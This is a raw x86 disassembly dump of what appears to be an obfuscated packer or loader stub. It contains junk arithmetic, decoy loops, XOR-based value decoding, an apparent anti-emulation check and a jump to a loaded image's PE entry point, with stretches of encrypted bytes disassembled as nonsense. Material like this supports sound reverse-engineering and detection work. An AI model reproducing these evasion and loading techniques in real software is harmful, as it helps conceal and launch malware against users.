  40d84c:	cmc    
  40d84d:	jle    0x40d8b3
  40d84f:	push   ds
  40d850:	retf   
  40d851:	sbb    DWORD PTR ds:0x106b75b3,0x1cc70b7a
  40d85b:	and    al,0x9f
  40d85d:	sub    BYTE PTR [eax+0x2668d1cc],0xc6
  40d864:	retf   
  40d865:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d866:	(bad)  
  40d867:	jecxz  0x40d80b
  40d869:	retf   
  40d86a:	fnstsw WORD PTR [ebx+ecx*4+0x1d7f45e1]
  40d871:	int    0x3
  40d873:	jge    0x40d865
  40d875:	mov    edx,DWORD PTR [ebp-0x20]
  40d878:	mov    ebx,DWORD PTR [ebp-0x8]
  40d87b:	xor    edx,eax
  40d87d:	add    edx,ecx
  40d87f:	imul   edx,ebx
  40d882:	cmp    edx,edi
  40d884:	jbe    0x40a7b9
  40d88a:	pop    ebx
  40d88b:	pop    edi
  40d88c:	leave  
  40d88d:	ret    0x8
  40d890:	push   ebp
  40d891:	mov    ebp,esp
  40d893:	sub    esp,0x70
  40d896:	or     DWORD PTR ds:0x42fd69,0x42e19c
  40d8a0:	push   0x41b2bc
  40d8a5:	sbb    DWORD PTR ds:0x42fdf6,0x42fd71
  40d8af:	call   DWORD PTR ds:0x42e517
  40d8b5:	and    DWORD PTR ds:0x42fd7d,0x42fe02
  40d8bf:	test   ax,ax
  40d8c2:	jne    0x40d8d9
  40d8c8:	xor    eax,eax
  40d8ca:	mov    DWORD PTR ds:0x42e1b4,0x1bc4
  40d8d4:	jmp    0x40e0cc
  40d8d9:	adc    DWORD PTR ds:0x42e1a4,0x42fd69
  40d8e3:	push   0x41b2d4
  40d8e8:	call   DWORD PTR ds:0x42e58f
  40d8ee:	sbb    DWORD PTR ds:0x42e77b,0x42fdf2
  40d8f8:	test   ax,ax
  40d8fb:	mov    DWORD PTR ds:0x42fd75,0x74f8
  40d905:	je     0x40d8c8
  40d90b:	call   DWORD PTR ds:0x42e4d7
  40d911:	cdq    
  40d912:	mov    DWORD PTR ds:0x42fd85,0x1251
  40d91c:	cmp    eax,0x45767589
  40d921:	jne    0x40d98c
  40d927:	mov    DWORD PTR ds:0x42fdf6,0x294f
  40d931:	cmp    edx,0x87676567
  40d937:	jne    0x40d98c
  40d93d:	push   0x0
  40d93f:	push   0x0
  40d941:	adc    DWORD PTR ds:0x42e1a4,0x42e777
  40d94b:	push   0x9879874
  40d950:	push   0x45
  40d952:	push   0x1
  40d954:	push   0x545
  40d959:	push   0x87686787
  40d95e:	xor    DWORD PTR ds:0x42fdee,0x75b9
  40d968:	push   0x9879877
  40d96d:	or     DWORD PTR ds:0x42fd6d,0x42e198
  40d977:	call   DWORD PTR ds:0x42e51f
  40d97d:	mov    DWORD PTR ds:0x42e19c,0x1611
  40d987:	jmp    0x40e0cc
  40d98c:	push   0x41b2e0
  40d991:	call   DWORD PTR ds:0x42e40f
  40d997:	test   eax,eax
  40d999:	je     0x40d9cd
  40d99f:	sbb    DWORD PTR ds:0x42fd81,0x42e1b4
  40d9a9:	push   0x41b314
  40d9ae:	and    DWORD PTR ds:0x42fd6d,0x2b9d
  40d9b8:	call   DWORD PTR ds:0x42e37b
  40d9be:	mov    DWORD PTR ds:0x42fe0a,0x47ee
  40d9c8:	jmp    0x40e0cc
  40d9cd:	push   ebx
  40d9ce:	mov    ebx,0xf89c8531
  40d9d3:	add    DWORD PTR ds:0x42e198,ebx
  40d9d9:	mov    DWORD PTR [ebp-0x8],ebx
  40d9dc:	and    DWORD PTR ds:0x42fd75,0x0
  40d9e6:	mov    ecx,DWORD PTR ds:0x42fd75
  40d9ec:	inc    ecx
  40d9ed:	mov    DWORD PTR ds:0x42fd75,ecx
  40d9f3:	cmp    DWORD PTR ds:0x42fd75,0xf
  40d9fa:	jne    0x40da20
  40da00:	push   0x1990
  40da05:	push   0x7f06
  40da0a:	push   0x857e
  40da0f:	push   DWORD PTR [ebp-0x28]
  40da12:	push   0x42e20d
  40da17:	push   DWORD PTR [ebp-0x10]
  40da1a:	call   DWORD PTR ds:0x42e5cf
  40da20:	cmp    DWORD PTR ds:0x42fd75,0xe
  40da27:	jne    0x40da3a
  40da2d:	mov    ecx,DWORD PTR ds:0x42fd75
  40da33:	inc    ecx
  40da34:	mov    DWORD PTR ds:0x42fd75,ecx
  40da3a:	cmp    DWORD PTR ds:0x42fd75,0x1d
  40da41:	jb     0x40d9e6
  40da47:	add    DWORD PTR ds:0x42e783,0x406c
  40da51:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  40da58:	lea    eax,[ebp-0x18]
  40da5b:	adc    DWORD PTR ds:0x42e773,ecx
  40da61:	mov    DWORD PTR [ebp-0x14],eax
  40da64:	adc    DWORD PTR ds:0x42fd51,0x42e19c
  40da6e:	lea    eax,[ebp-0x1c]
  40da71:	mov    DWORD PTR ds:0x42fd85,0x1a
  40da7b:	cmp    DWORD PTR ds:0x42fd85,0x0
  40da82:	je     0x40dbc3
  40da88:	cmp    DWORD PTR ds:0x42fd85,0x1c
  40da8f:	jne    0x40daa1
  40da95:	push   DWORD PTR [ebp-0x1c]
  40da98:	push   DWORD PTR [ebp-0x14]
  40da9b:	call   DWORD PTR ds:0x42e5d3
  40daa1:	xor    ecx,ecx
  40daa3:	add    ecx,DWORD PTR ds:0x42fd85
  40daa9:	dec    ecx
  40daaa:	mov    DWORD PTR ds:0x42fd85,ecx
  40dab0:	jmp    0x40da7b
  40dab5:	mov    DWORD PTR ds:0x42e787,0x1d
  40dabf:	cmp    DWORD PTR ds:0x42e787,0x0
  40dac6:	je     0x40dbc3
  40dacc:	cmp    DWORD PTR ds:0x42e787,0xf
  40dad3:	jne    0x40dae4
  40dad9:	push   0x1303
  40dade:	call   DWORD PTR ds:0x42e4e3
  40dae4:	cmp    DWORD PTR ds:0x42e787,0x10
  40daeb:	jne    0x40dafe
  40daf1:	mov    ecx,DWORD PTR ds:0x42e787
  40daf7:	dec    ecx
  40daf8:	mov    DWORD PTR ds:0x42e787,ecx
  40dafe:	mov    ecx,DWORD PTR ds:0x42e787
  40db04:	dec    ecx
  40db05:	mov    DWORD PTR ds:0x42e787,ecx
  40db0b:	jmp    0x40dabf
  40db10:	mov    DWORD PTR ds:0x42e77f,0x14
  40db1a:	cmp    DWORD PTR ds:0x42e77f,0x0
  40db21:	je     0x40dbc3
  40db27:	cmp    DWORD PTR ds:0x42e77f,0x2
  40db2e:	jne    0x40db41
  40db34:	push   0x1
  40db36:	push   0x279d
  40db3b:	call   DWORD PTR ds:0x42e5d7
  40db41:	cmp    DWORD PTR ds:0x42e77f,0x3
  40db48:	jne    0x40db5b
  40db4e:	mov    ecx,DWORD PTR ds:0x42e77f
  40db54:	dec    ecx
  40db55:	mov    DWORD PTR ds:0x42e77f,ecx
  40db5b:	mov    ecx,DWORD PTR ds:0x42e77f
  40db61:	dec    ecx
  40db62:	mov    DWORD PTR ds:0x42e77f,ecx
  40db68:	jmp    0x40db1a
  40db6d:	mov    DWORD PTR ds:0x42fdf6,0x1a
  40db77:	cmp    DWORD PTR ds:0x42fdf6,0x0
  40db7e:	je     0x40dbc3
  40db84:	cmp    DWORD PTR ds:0x42fdf6,0x6
  40db8b:	jne    0x40db97
  40db91:	call   DWORD PTR ds:0x42e5db
  40db97:	cmp    DWORD PTR ds:0x42fdf6,0x7
  40db9e:	jne    0x40dbb1
  40dba4:	mov    ecx,DWORD PTR ds:0x42fdf6
  40dbaa:	dec    ecx
  40dbab:	mov    DWORD PTR ds:0x42fdf6,ecx
  40dbb1:	mov    ecx,DWORD PTR ds:0x42fdf6
  40dbb7:	dec    ecx
  40dbb8:	mov    DWORD PTR ds:0x42fdf6,ecx
  40dbbe:	jmp    0x40db77
  40dbc3:	mov    DWORD PTR [ebp-0xc],eax
  40dbc6:	or     ecx,eax
  40dbc8:	mov    eax,ds:0x41b1a8
  40dbcd:	or     DWORD PTR ds:0x42e787,edx
  40dbd3:	mov    eax,DWORD PTR [eax+0x1c8]
  40dbd9:	or     DWORD PTR ds:0x42e793,edx
  40dbdf:	mov    eax,DWORD PTR [eax]
  40dbe1:	mov    ecx,DWORD PTR [ebp-0xc]
  40dbe4:	push   esi
  40dbe5:	mov    esi,0x7510855
  40dbea:	sub    DWORD PTR ds:0x42fdfe,0x662
  40dbf4:	xor    eax,esi
  40dbf6:	push   edi
  40dbf7:	and    DWORD PTR ds:0x42fd65,0x0
  40dc01:	jmp    0x40dc13
  40dc06:	mov    edi,DWORD PTR ds:0x42fd65
  40dc0c:	inc    edi
  40dc0d:	mov    DWORD PTR ds:0x42fd65,edi
  40dc13:	cmp    DWORD PTR ds:0x42fd65,0x1d
  40dc1a:	jae    0x40dc4a
  40dc20:	cmp    DWORD PTR ds:0x42fd65,0x2b
  40dc27:	jne    0x40dc45
  40dc2d:	push   0x3dd1
  40dc32:	push   DWORD PTR [ebp-0x24]
  40dc35:	push   0x2bbe
  40dc3a:	push   0x75d2
  40dc3f:	call   DWORD PTR ds:0x42e4e7
  40dc45:	jmp    0x40dc06
  40dc4a:	mov    edi,0x32729c
  40dc4f:	add    eax,edi
  40dc51:	mov    DWORD PTR [ecx],eax
  40dc53:	mov    DWORD PTR ds:0x42e1a8,edx
  40dc59:	mov    eax,ds:0x41b418
  40dc5e:	mov    DWORD PTR ds:0x42fd81,0x477b
  40dc68:	cmp    eax,0x23c13046
  40dc6d:	mov    eax,DWORD PTR [ebp-0x4]
  40dc70:	mov    DWORD PTR ds:0x42fd89,0x45bc
  40dc7a:	je     0x40dd06
  40dc80:	mov    DWORD PTR ds:0x42e777,0x1c
  40dc8a:	cmp    DWORD PTR ds:0x42e777,0x0
  40dc91:	je     0x40dcd6
  40dc97:	cmp    DWORD PTR ds:0x42e777,0xa
  40dc9e:	jne    0x40dcaa
  40dca4:	call   DWORD PTR ds:0x42e4eb
  40dcaa:	cmp    DWORD PTR ds:0x42e777,0xb
  40dcb1:	jne    0x40dcc4
  40dcb7:	mov    ecx,DWORD PTR ds:0x42e777
  40dcbd:	dec    ecx
  40dcbe:	mov    DWORD PTR ds:0x42e777,ecx
  40dcc4:	mov    ecx,DWORD PTR ds:0x42e777
  40dcca:	dec    ecx
  40dccb:	mov    DWORD PTR ds:0x42e777,ecx
  40dcd1:	jmp    0x40dc8a
  40dcd6:	mov    ecx,DWORD PTR [ebp-0x8]
  40dcd9:	sbb    DWORD PTR ds:0x42fe02,0x42e1ac
  40dce3:	xor    eax,esi
  40dce5:	and    DWORD PTR ds:0x42fe02,0x42e1a4
  40dcef:	add    eax,edi
  40dcf1:	imul   eax,ecx
  40dcf4:	mov    DWORD PTR [ebp-0x8],eax
  40dcf7:	mov    DWORD PTR ds:0x42fd51,0x365a
  40dd01:	jmp    0x40ddd3
  40dd06:	sbb    DWORD PTR ds:0x42e198,edx
  40dd0c:	xor    eax,esi
  40dd0e:	add    eax,edi
  40dd10:	and    DWORD PTR ds:0x42fdf2,0x0
  40dd1a:	jmp    0x40dd2c
  40dd1f:	mov    ecx,DWORD PTR ds:0x42fdf2
  40dd25:	inc    ecx
  40dd26:	mov    DWORD PTR ds:0x42fdf2,ecx
  40dd2c:	cmp    DWORD PTR ds:0x42fdf2,0x12
  40dd33:	jae    0x40dd6e
  40dd39:	cmp    DWORD PTR ds:0x42fdf2,0x6
  40dd40:	jne    0x40dd4f
  40dd46:	push   DWORD PTR [ebp-0x24]
  40dd49:	call   DWORD PTR ds:0x42e4ef
  40dd4f:	cmp    DWORD PTR ds:0x42fdf2,0x5
  40dd56:	jne    0x40dd69
  40dd5c:	mov    ecx,DWORD PTR ds:0x42fdf2
  40dd62:	inc    ecx
  40dd63:	mov    DWORD PTR ds:0x42fdf2,ecx
  40dd69:	jmp    0x40dd1f
  40dd6e:	mov    ds:0x41b2b8,eax
  40dd73:	mov    eax,DWORD PTR [ebp-0x8]
  40dd76:	or     DWORD PTR ds:0x42fd8d,edx
  40dd7c:	xor    eax,esi
  40dd7e:	sub    DWORD PTR ds:0x42e1b0,edx
  40dd84:	add    eax,edi
  40dd86:	mov    ds:0x41b418,eax
  40dd8b:	mov    eax,DWORD PTR [ebp-0x4]
  40dd8e:	mov    ecx,DWORD PTR ds:0x41b2b8
  40dd94:	xor    eax,esi
  40dd96:	add    eax,edi
  40dd98:	mov    DWORD PTR ds:0x42fd89,0x3e5c
  40dda2:	cmp    ecx,eax
  40dda4:	jne    0x40ddd3
  40ddaa:	sub    DWORD PTR ds:0x42fe06,0x42fd7d
  40ddb4:	push   DWORD PTR [ebp-0x4]
  40ddb7:	and    DWORD PTR ds:0x42e773,0x4c1c
  40ddc1:	push   DWORD PTR [ebp-0x8]
  40ddc4:	adc    DWORD PTR ds:0x42e77f,0x42fe0a
  40ddce:	call   0x40e0d0
  40ddd3:	mov    eax,ds:0x41b1a8
  40ddd8:	sbb    edx,DWORD PTR ds:0x42e76b
  40ddde:	mov    eax,DWORD PTR [eax+0x18c]
  40dde4:	and    DWORD PTR ds:0x42fd65,0x0
  40ddee:	mov    edx,DWORD PTR ds:0x42fd65
  40ddf4:	inc    edx
  40ddf5:	mov    DWORD PTR ds:0x42fd65,edx
  40ddfb:	cmp    DWORD PTR ds:0x42fd65,0x18
  40de02:	jne    0x40de18
  40de08:	push   0x42fd89
  40de0d:	push   0x42e2ed
  40de12:	call   DWORD PTR ds:0x42e4f3
  40de18:	cmp    DWORD PTR ds:0x42fd65,0x13
  40de1f:	jb     0x40ddee
  40de25:	mov    ecx,DWORD PTR ds:0x42fda1
  40de2b:	mov    ecx,DWORD PTR [ecx]
  40de2d:	or     DWORD PTR ds:0x42fd7d,ecx
  40de33:	mov    eax,DWORD PTR [eax]
  40de35:	mov    DWORD PTR ds:0x42fd75,0x11
  40de3f:	cmp    DWORD PTR ds:0x42fd75,0x0
  40de46:	je     0x40de77
  40de4c:	cmp    DWORD PTR ds:0x42fd75,0x19
  40de53:	jne    0x40de65
  40de59:	push   DWORD PTR [ebp-0xc]
  40de5c:	push   DWORD PTR [ebp-0x10]
  40de5f:	call   DWORD PTR ds:0x42e5df
  40de65:	mov    edx,DWORD PTR ds:0x42fd75
  40de6b:	dec    edx
  40de6c:	mov    DWORD PTR ds:0x42fd75,edx
  40de72:	jmp    0x40de3f
  40de77:	mov    DWORD PTR [ebp-0x20],eax
  40de7a:	mov    eax,0xf89c853d
  40de7f:	mov    DWORD PTR [ebp-0x24],eax
  40de82:	mov    DWORD PTR [ebp-0x24],eax
  40de85:	mov    DWORD PTR [ebp-0x24],eax
  40de88:	mov    DWORD PTR [ebp-0xc],ebx
  40de8b:	mov    DWORD PTR [ebp-0x24],eax
  40de8e:	mov    DWORD PTR [ebp-0x24],0xf89c8539
  40de95:	mov    ebx,DWORD PTR [ebp-0x8]
  40de98:	mov    ecx,DWORD PTR [ebp-0x4]
  40de9b:	mov    edx,DWORD PTR [ebp-0x4]
  40de9e:	xor    edx,esi
  40dea0:	xor    ecx,esi
  40dea2:	add    ecx,edx
  40dea4:	mov    edx,DWORD PTR [ebp-0x4]
  40dea7:	xor    ebx,esi
  40dea9:	xor    edx,esi
  40deab:	add    ebx,edi
  40dead:	lea    ecx,[ecx+edx*1+0x9757d4]
  40deb4:	cmp    ebx,ecx
  40deb6:	ja     0x40df17
  40debc:	mov    eax,DWORD PTR [ebp-0x4]
  40debf:	xor    eax,esi
  40dec1:	lea    eax,[eax+ebx*1+0x32729c]
  40dec8:	push   eax
  40dec9:	mov    eax,DWORD PTR [ebp-0xc]
  40decc:	xor    eax,esi
  40dece:	lea    eax,[ebp+eax*1+0x3272a4]
  40ded5:	push   eax
  40ded6:	mov    eax,ds:0x41b1a8
  40dedb:	push   DWORD PTR [eax+0x1bc]
  40dee1:	call   0x402976
  40dee6:	mov    eax,DWORD PTR [ebp-0x4]
  40dee9:	xor    eax,esi
  40deeb:	lea    ebx,[ebx+eax*1+0x32729c]
  40def2:	mov    eax,DWORD PTR [ebp-0x4]
  40def5:	mov    ecx,DWORD PTR [ebp-0x4]
  40def8:	xor    ecx,esi
  40defa:	xor    eax,esi
  40defc:	add    eax,ecx
  40defe:	mov    ecx,DWORD PTR [ebp-0x4]
  40df01:	xor    ecx,esi
  40df03:	lea    eax,[eax+ecx*1+0x9757d4]
  40df0a:	cmp    ebx,eax
  40df0c:	jbe    0x40debc
  40df12:	mov    eax,0xf89c853d
  40df17:	mov    ecx,DWORD PTR [ebp+0xc]
  40df1a:	mov    DWORD PTR ds:0x41b02c,ecx
  40df20:	mov    ecx,DWORD PTR [ebp+0x10]
  40df23:	mov    DWORD PTR ds:0x41b280,ecx
  40df29:	mov    ecx,DWORD PTR ds:0x41b02c
  40df2f:	mov    edx,DWORD PTR [ebp-0x14]
  40df32:	sub    ecx,edi
  40df34:	xor    ecx,esi
  40df36:	mov    DWORD PTR [edx],ecx
  40df38:	mov    ecx,DWORD PTR [ebp-0x18]
  40df3b:	cmp    ecx,0xf89c8530
  40df41:	je     0x40df9e
  40df47:	mov    ecx,DWORD PTR [ebp-0x8]
  40df4a:	mov    edx,DWORD PTR [ebp-0x1c]
  40df4d:	xor    ecx,esi
  40df4f:	add    ecx,edi
  40df51:	cmp    ecx,edx
  40df53:	je     0x40df9e
  40df59:	mov    eax,ds:0x41b1a8
  40df5e:	mov    eax,DWORD PTR [eax+0x194]
  40df64:	mov    ecx,DWORD PTR [eax]
  40df66:	mov    eax,DWORD PTR [ecx+0x3c]
  40df69:	push   DWORD PTR ds:0x41b280
  40df6f:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40df73:	push   DWORD PTR ds:0x41b02c
  40df79:	add    eax,ecx
  40df7b:	mov    ecx,DWORD PTR ds:0x41b1a8
  40df81:	mov    ecx,DWORD PTR [ecx+0x194]
  40df87:	push   DWORD PTR [ecx]
  40df89:	call   eax
  40df8b:	mov    ecx,DWORD PTR ds:0x41b1a8
  40df91:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40df97:	mov    DWORD PTR [ecx],eax
  40df99:	jmp    0x40e0ae
  40df9e:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfa1:	mov    edx,DWORD PTR [ebp-0x20]
  40dfa4:	xor    ecx,esi
  40dfa6:	add    ecx,edi
  40dfa8:	cmp    ecx,edx
  40dfaa:	jne    0x40e091
  40dfb0:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfb3:	xor    ecx,esi
  40dfb5:	add    ecx,edi
  40dfb7:	mov    DWORD PTR ds:0x41b22c,ecx
  40dfbd:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfc0:	xor    ecx,esi
  40dfc2:	add    ecx,edi
  40dfc4:	mov    DWORD PTR ds:0x41b224,ecx
  40dfca:	mov    ecx,DWORD PTR [ebp-0x4]
  40dfcd:	mov    DWORD PTR [ebp-0xc],ecx
  40dfd0:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfd3:	mov    DWORD PTR [ebp+0xc],ecx
  40dfd6:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfd9:	xor    ecx,esi
  40dfdb:	add    ecx,edi
  40dfdd:	mov    DWORD PTR [ebp+0xc],ecx
  40dfe0:	mov    ecx,DWORD PTR ds:0x41b028
  40dfe6:	mov    ecx,DWORD PTR [ecx]
  40dfe8:	mov    DWORD PTR [ebp+0xc],ecx
  40dfeb:	mov    ecx,DWORD PTR ds:0x41b230
  40dff1:	mov    ecx,DWORD PTR [ecx]
  40dff3:	mov    DWORD PTR [ebp-0x14],ecx
  40dff6:	mov    DWORD PTR [ebp+0x10],0xf89c8731
  40dffd:	mov    ecx,DWORD PTR [ebp+0x10]
  40e000:	xor    ecx,esi
  40e002:	add    ecx,edi
  40e004:	mov    DWORD PTR [ebp+0x10],ecx
  40e007:	mov    ecx,DWORD PTR ds:0x41b1a8
  40e00d:	mov    DWORD PTR [ebp+0x10],ecx
  40e010:	mov    ecx,DWORD PTR [ebp+0xc]
  40e013:	mov    DWORD PTR [ebp+0xc],ecx
  40e016:	mov    ecx,DWORD PTR [ebp+0xc]
  40e019:	push   0x4
  40e01b:	pop    edx
  40e01c:	sub    edx,ecx
  40e01e:	add    edx,DWORD PTR [ebp-0x14]
  40e021:	mov    DWORD PTR [ebp-0x24],0xf89c85f1
  40e028:	mov    DWORD PTR [ebp+0x10],edx
  40e02b:	mov    DWORD PTR [ebp-0x70],eax
  40e02e:	mov    eax,DWORD PTR [ebp+0xc]
  40e031:	mov    DWORD PTR [ebp-0x6c],eax
  40e034:	mov    eax,DWORD PTR [ebp+0x10]
  40e037:	mov    DWORD PTR [ebp-0x68],eax
  40e03a:	mov    eax,DWORD PTR [ebp-0x24]
  40e03d:	xor    eax,esi
  40e03f:	add    eax,edi
  40e041:	mov    DWORD PTR [ebp-0x64],eax
  40e044:	lea    eax,[ebp-0x2c]
  40e047:	mov    DWORD PTR [ebp-0x60],eax
  40e04a:	mov    eax,DWORD PTR [ebp-0x70]
  40e04d:	xor    eax,esi
  40e04f:	add    eax,edi
  40e051:	mov    DWORD PTR [ebp-0x70],eax
  40e054:	lea    eax,[ebp-0x70]
  40e057:	push   eax
  40e058:	mov    eax,DWORD PTR [ebp-0xc]
  40e05b:	xor    eax,esi
  40e05d:	add    eax,edi
  40e05f:	push   eax
  40e060:	mov    eax,ds:0x41b1c8
  40e065:	push   0x41b11e
  40e06a:	push   DWORD PTR [eax]
  40e06c:	call   0x4120bb
  40e071:	xor    esi,esi
  40e073:	mov    eax,DWORD PTR [ebp+0x10]
  40e076:	sub    eax,esi
  40e078:	push   eax
  40e079:	mov    eax,DWORD PTR [ebp+0xc]
  40e07c:	add    eax,esi
  40e07e:	push   eax
  40e07f:	call   0x4099c9
  40e084:	inc    esi
  40e085:	cmp    esi,0x52
  40e088:	jb     0x40e073
  40e08e:	mov    eax,DWORD PTR [ebp-0xc]
  40e091:	call   0x406acb
  40e096:	lea    eax,[ebp+0x4]
  40e099:	mov    DWORD PTR [ebp-0x28],eax
  40e09c:	mov    eax,DWORD PTR [ebp-0x10]
  40e09f:	mov    eax,DWORD PTR [ebp-0x4]
  40e0a2:	push   DWORD PTR [ebp-0x8]
  40e0a5:	lea    eax,[ebp-0x28]
  40e0a8:	push   eax
  40e0a9:	call   0x410b90
  40e0ae:	mov    eax,ds:0x41b1a8
  40e0b3:	push   0x4
  40e0b5:	add    eax,0x1cc
  40e0ba:	push   eax
  40e0bb:	lea    eax,[ebp-0x10]
  40e0be:	push   eax
  40e0bf:	call   0x402976
  40e0c4:	mov    eax,DWORD PTR [ebp-0x10]
  40e0c7:	mov    eax,DWORD PTR [eax]
  40e0c9:	pop    edi
  40e0ca:	pop    esi
  40e0cb:	pop    ebx
  40e0cc:	leave  
  40e0cd:	ret    0xc
  40e0d0:	push   ebp
  40e0d1:	mov    ebp,esp
  40e0d3:	sub    esp,0x24
  40e0d6:	mov    eax,ds:0x41b1a8
  40e0db:	mov    eax,DWORD PTR [eax+0x198]
  40e0e1:	mov    DWORD PTR [ebp-0x8],eax
  40e0e4:	adc    ecx,eax
  40e0e6:	mov    eax,DWORD PTR [ebp+0x8]
  40e0e9:	mov    ecx,DWORD PTR [ebp-0x8]
  40e0ec:	xor    DWORD PTR ds:0x42fd69,0x42fd55
  40e0f6:	push   ebx
  40e0f7:	push   esi
  40e0f8:	mov    esi,0x7510855
  40e0fd:	xor    eax,esi
  40e0ff:	not    ebx
  40e101:	push   edi
  40e102:	mov    edi,0x32729c
  40e107:	add    eax,edi
  40e109:	sbb    ebx,DWORD PTR ds:0x42fd69
  40e10f:	jmp    0x40e279
  40e114:	sub    dl,0xce
  40e117:	gs push 0x61
  40e11a:	mov    bh,0xf1
  40e11c:	fstp   DWORD PTR [ecx-0x593e2fbc]
  40e122:	push   0x41
  40e124:	push   0xc37070a6
  40e129:	jg     0x40e19b
  40e12b:	jo     0x40e171
  40e12d:	mov    esp,0xf8fb1bbe
  40e132:	dec    ebp
  40e133:	xchg   esp,eax
  40e134:	lds    esi,FWORD PTR [edx]
  40e136:	push   esp
  40e137:	jle    0x40e16d
  40e139:	hlt    
  40e13a:	push   es
  40e13b:	fcomi  st,st(1)
  40e13d:	mov    bl,0x3c
  40e13f:	push   ss
  40e140:	or     al,0x14
  40e142:	cwde   
  40e143:	push   esi
  40e144:	mov    ebx,0x151808bd
  40e149:	popf   
  40e14a:	ror    bh,cl
  40e14c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e14d:	clc    
  40e14e:	not    DWORD PTR [ebp+0x1f7041f6]
  40e154:	cmp    al,0x14
  40e156:	or     DWORD PTR [edx+0x62],edi
  40e159:	je     0x40e1c2
  40e15b:	xor    al,0x97
  40e15d:	add    BYTE PTR [edx-0x50],0x63
  40e161:	push   ebx
  40e162:	into   
  40e163:	out    0xd1,eax
  40e165:	add    BYTE PTR [ebp-0x64],0xd
  40e169:	add    cl,BYTE PTR [esi]
  40e16b:	xor    eax,0x34e305a9
  40e170:	dec    edx
  40e171:	jmp    0x40e15f
  40e173:	pop    esi
  40e174:	clc    
  40e175:	push   ecx
  40e176:	test   eax,0xd74f9dde
  40e17b:	cvtps2pd xmm5,QWORD PTR [eax]
  40e17e:	out    0x4b,eax
  40e180:	cdq    
  40e181:	imul   DWORD PTR [edx-0x5d121f98]
  40e187:	std    
  40e188:	add    ebp,DWORD PTR [ebp-0x4e32d938]
  40e18e:	ins    BYTE PTR es:[edi],dx
  40e18f:	imul   ecx,esi,0xffffffb0
  40e192:	lahf   
  40e193:	pop    esi
  40e194:	cmp    al,BYTE PTR [esi+ebx*8-0x6f]
  40e198:	xchg   edi,eax
  40e199:	int3   
  40e19a:	inc    ebx
  40e19b:	inc    ecx
  40e19c:	arpl   WORD PTR [edx],ax
  40e19e:	outs   dx,DWORD PTR ds:[esi]
  40e19f:	in     eax,0x6b
  40e1a1:	inc    edx
  40e1a2:	(bad)  
  40e1a3:	imul   edi,DWORD PTR [edx+0x5a],0xffffff91
  40e1a7:	pop    ebx
  40e1a8:	pop    ss
  40e1a9:	push   eax
  40e1aa:	pop    esp
  40e1ab:	aas    
  40e1ac:	xor    al,0x9
  40e1ae:	jbe    0x40e130
  40e1b0:	jmp    0xcd19:0x637d5d77
  40e1b7:	mov    ch,0x7d
  40e1b9:	stos   BYTE PTR es:[edi],al
  40e1ba:	dec    ecx
  40e1bb:	xchg   edi,eax
  40e1bc:	adc    eax,0x7fd2696d
  40e1c1:	inc    edi
  40e1c2:	and    DWORD PTR [edx+0x50],esp
  40e1c5:	ja     0x40e162
  40e1c7:	and    BYTE PTR [esi+0x5c3c75db],0xc
  40e1ce:	lahf   
  40e1cf:	ins    BYTE PTR es:[edi],dx
  40e1d0:	stos   DWORD PTR es:[edi],eax
  40e1d1:	xor    BYTE PTR [esi],0xf4
  40e1d4:	adc    bh,dh
  40e1d6:	cmp    ch,al
  40e1d8:	lahf   
  40e1d9:	fsub   DWORD PTR [eax+0x56]
  40e1dc:	inc    edx
  40e1dd:	and    al,0xa2
  40e1df:	mov    dh,0xd
  40e1e1:	packssdw mm3,mm7
  40e1e4:	test   eax,0xa9beade0
  40e1e9:	push   cs
  40e1ea:	mov    eax,0xf5bf23c
  40e1ef:	mov    ds:0x9b90fbf3,eax
  40e1f4:	bound  ebx,QWORD PTR [ecx]
  40e1f6:	jb     0x40e206
  40e1f8:	scas   eax,DWORD PTR es:[edi]
  40e1f9:	add    DWORD PTR [esi+eax*1+0x1aed0242],esp
  40e200:	xchg   esi,eax
  40e201:	pop    ebp
  40e202:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e203:	scas   al,BYTE PTR es:[edi]
  40e204:	dec    ebp
  40e205:	mov    esi,0x9d88461c
  40e20a:	mov    dh,0xbd
  40e20c:	adc    eax,0x1102103a
  40e211:	stc    
  40e212:	mov    ecx,0xd128481b
  40e217:	push   esi
  40e218:	xchg   edi,eax
  40e219:	mov    al,0xd0
  40e21b:	cld    
  40e21c:	jno    0x40e1f2
  40e21e:	dec    ebx
  40e21f:	jecxz  0x40e1ac
  40e221:	(bad)
  40e225:	(bad)  
  40e226:	ds dec ebx
  40e228:	js     0x40e1f4
  40e22a:	psrlw  mm2,QWORD PTR [ebp-0x41e8353d]
  40e231:	loopne 0x40e226
  40e233:	das    
  40e234:	jb     0x40e27e
  40e236:	arpl   WORD PTR [esi+ebp*4+0x7e],cx
  40e23a:	imul   BYTE PTR [eax-0x37]
  40e23d:	and    eax,0xca6531d1
  40e242:	mov    eax,ds:0x6b52a58b
  40e247:	sub    al,0x37
  40e249:	mov    cl,BYTE PTR [edx+0x23]
  40e24c:	arpl   WORD PTR [edi],si
  40e24e:	out    0x3d,eax
  40e250:	add    DWORD PTR [ebx+0x53],ecx
  40e253:	fwait
  40e254:	jno    0x40e27d
  40e256:	pop    esp
  40e257:	adc    eax,0xd719c720
  40e25c:	or     eax,0x20324479
  40e261:	fimul  WORD PTR [eax-0x70]
  40e264:	mov    ebx,0x69ef641f
  40e269:	(bad)  
  40e26a:	mov    dh,0xdc
  40e26c:	out    0xd8,eax
  40e26e:	jmp    0xf90:0x3739bbd2
  40e275:	test   DWORD PTR [edi+0x7b],edx
  40e278:	adc    al,0x89
  40e27a:	add    DWORD PTR [ebp+0x2581fc45],ecx
  40e280:	jge    0x40e27f
  40e282:	inc    edx
  40e283:	add    BYTE PTR [eax],al
  40e285:	add    BYTE PTR [eax],al
  40e287:	add    BYTE PTR [ebx+0x42fd7d0d],cl
  40e28d:	add    BYTE PTR [ecx-0x77],al
  40e290:	or     eax,0x42fd7d
  40e295:	cmp    DWORD PTR ds:0x42fd7d,0x8
  40e29c:	jne    0x40e2b0
  40e2a2:	push   DWORD PTR [ebp-0x14]
  40e2a5:	push   0x5961
  40e2aa:	call   DWORD PTR ds:0x42e5e3
